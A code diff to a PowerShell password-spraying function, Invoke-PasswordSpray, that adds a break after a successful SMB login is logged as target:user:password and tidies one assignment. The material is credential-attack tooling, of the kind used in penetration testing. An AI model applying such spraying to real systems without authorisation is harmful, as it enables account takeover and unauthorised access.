@@ -61,6 +61,7 @@ function Invoke-PasswordSpray
         {
           $Result += ((Get-Date -Format [hh:mm:ss]) + " " + $Target + ":" + $User + ":" + $Password)
           Remove-SmbMapping -RemotePath \\$Target\IPC$ -Force -Confirm 2>&1 | Out-Null
+          break
         }
       }
     }
@@ -69,7 +70,7 @@ function Invoke-PasswordSpray
 
   if($Split)
   {
-    $SplitUsers=@{}
+    $SplitUsers = @{}
     $Base = 0
     $TargetCounter = -1
     $ChunkSize = [int]($Users.Count/$Targets.Count)
